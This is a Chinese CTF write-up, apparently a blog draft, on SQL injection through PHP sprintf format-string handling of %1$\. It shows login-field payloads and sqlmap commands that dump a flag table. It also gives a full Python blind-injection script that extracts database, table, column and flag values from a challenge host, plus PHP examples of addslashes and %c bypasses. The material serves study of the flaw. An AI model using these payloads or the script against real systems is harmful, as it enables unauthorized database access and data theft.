---
title: '格式化字符串与SQL注入'
date: 2019-01-01
category: '渗透测试'
tags: []
lang: 'zh'
draft: true
---
今天第一次接触到这种题目

![](https://upload-images.jianshu.io/upload_images/10651191-1c4d41e4df980b47.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

就是在试探%这个符号时会报如下错误

构造的payload如下：

`username=admin%1$\' and 1=2# 与 username=admin%1$\' and 1=1#`

观察到一个是password error，一个是username error
抓到post包，然后
`python sqlmap.py -r 3.txt -p username --level 3 --dbs --thread 10`
-r可以直接读取文件中的内容

最后是
`python sqlmap.py -r 3.txt -p username --level 3 -D ctf -T flag -C flag --dump --thread 10`

解释一下参数
* -r 读取数据包文件
* -p 注入点
* --level等级
* -D 指定数据库
* -T 指定表名
* -C 指定字段名
* --dump 将表中的数据dump出来

最后还以一个脚本
```python
#coding:utf-8
import requests
import string
 
def boom():
    url = r'http://f6f0cdc51f8141a6b1a8634161859c1c78499dc70eea47f0.game.ichunqiu.com/'
    s = requests.session()
	//会话对象requests.Session能够跨请求地保持某些参数，比如cookies，即在同一个Session实例发出的所有请求都保持同一个cookies,而requests模块每次会自动处理cookies，这样就很方便地处理登录时的cookies问题。
    dic = string.digits + string.letters + "!@#$%^&*()_+{}-="
    right = 'password error!'
    error = 'username error!'
    lens = 0
    i = 0
	//确定当前数据库的长度
    while True:
        payload = "admin%1$\\' or " + "length(database())>" + str(i) + "#"
        data={'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens=i
            break
        i+=1
        pass
    print("[+]length(database()): %d" %(lens))
	//确定当前数据库的名字
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr(database()," + str(i) +",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]database():%s" %(strs))
 
    lens=0
    i = 1
    while True:
        payload = "admin%1$\\' or " + "(select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)>" + str(i) + "#"
		//对当前的数据库，查询第一个表的长度
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(table): %d" %(lens))
 
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)," + str(i) +",1))=" + str(ord(c)) + "#"
			// 数字一定要str才可以传入
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]table_name:%s" %(strs))
    tablename = '0x' + strs.encode('hex')
	//编码为16进制
    table_name = strs
 
    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(column_name) from information_schema.columns where table_name = " + str(tablename) + " limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(column): %d" %(lens))
 
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or " + "ascii(substr((select column_name from information_schema.columns where table_name = " + str(tablename) +" limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':1}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]column_name:%s" %(strs))
    column_name = strs
	
    num=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select count(*) from " + table_name + ")>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            num = i
            break
        i+=1
        pass
    print("[+]number(column): %d" %(num))
 
    lens=0
    i = 0
    while True:
        payload = "admin%1$\\' or " + "(select length(" + column_name + ") from " + table_name + " limit 0,1)>" + str(i) + "#"
        data = {'username':payload,'password':1}
        r = s.post(url,data=data).content
        if error in r:
            lens = i
            break
        i+=1
        pass
    print("[+]length(value): %d" %(lens))
 
    i=1    
    strs=''
    for i in range(lens+1):
        for c in dic:
            payload = "admin%1$\\' or ascii(substr((select flag from flag limit 0,1)," + str(i) + ",1))=" + str(ord(c)) + "#"
            data = {'username':payload,'password':'1'}
            r = s.post(url,data=data).content
            if right in r:
                strs = strs + c
                print strs
                break
        pass
    pass
    print("[+]flag:%s" %(strs))
 
if __name__ == '__main__':
    boom()
    print 'Finish!'
```

## 关于格式化字符串与sprintf

```php
$string_b = 'where name = admin%1$c ';
echo vsprintf($string_b, array(39,40));
```
通过`%1$c`这种方式可以避免因为参数过少或者过多的问题

这样也行
```php
<?php
$number = 123;
$txt = sprintf("带有两位小数：%1\$.2f<br>不带小数：%1\$u",$number);
echo $txt;
?>
```

其实最大原因还是这个
 php源码中只对15种类型做了匹配， 其他字符类型都直接break了，php未做任何处理，直接跳过，所以导致了这个问题：

没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%1$\）被替换为空

这样才使得本文一开头提出的那个payload有效

比如这个例子
```php
$sql = "select * from user where username = '%\' and 1=1#';" ;
$args = "admin" ;
echo  sprintf ( $sql , $args ) ;
```

结果为
`select * from user where username = '' and 1=1#';`

## 再看一个借用 `addslashes`为跳板的例子

```php
<?php
$input = addslashes ("%1$' and 1=1#" );
$b = sprintf ("AND b='%s'", $input );
$sql = sprintf ("SELECT * FROM t WHERE a='%s' $b ", 'admin' );
//对$input与$b进行了拼接
//$sql = sprintf ("SELECT * FROM t WHERE a='%s' AND b='%1$\' and 1=1#' ", 'admin' );
//很明显，这个句子里面的\是由addsashes为了转义单引号而加上的，使用%s
//与%1$\类匹配admin，那么admin只会出现在%s里，%1$\为空
echo  $sql ;
 ```

## 利用%c

```php
<? php
$input1 = '%1$c) OR 1 = 1 /*' ;
$input2 = 39 ;
$sql = "SELECT * FROM foo WHERE bar IN (' $input1 ') AND baz = %s" ;
$sql = sprintf ( $sql , $input2 );
echo  $sql ;
```

结果为
`SELECT * FROM foo WHERE bar IN ('') OR 1 = 1 /*) AND baz = 39`

#参考链接
[https://blog.csdn.net/weixin_41185953/article/details/80485075](https://blog.csdn.net/weixin_41185953/article/details/80485075)
